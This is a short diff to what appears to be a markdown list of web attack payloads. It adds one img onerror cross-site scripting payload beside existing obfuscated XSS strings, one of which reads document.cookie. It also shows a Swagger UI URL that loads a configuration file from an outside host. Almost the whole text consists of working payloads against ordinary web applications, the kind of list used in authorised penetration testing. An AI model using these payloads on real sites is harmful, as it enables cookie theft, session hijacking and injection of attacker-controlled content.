@@ -19,6 +19,7 @@
 - javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
 - <svg/%20src=x%20onmouseover%3D"alert%26%230000000040%3B1)
 - <Img Src=OnXSS OnError​=confirm(document.cookie)>
+- //"><img src=x onerrora=confirm() onerror=confirm(1)>
 
 ## Swagger 
 - http://example(.)com/swagger-ui/index.html?configUrl=https://jumpy-floor.surge(.)sh/test.json
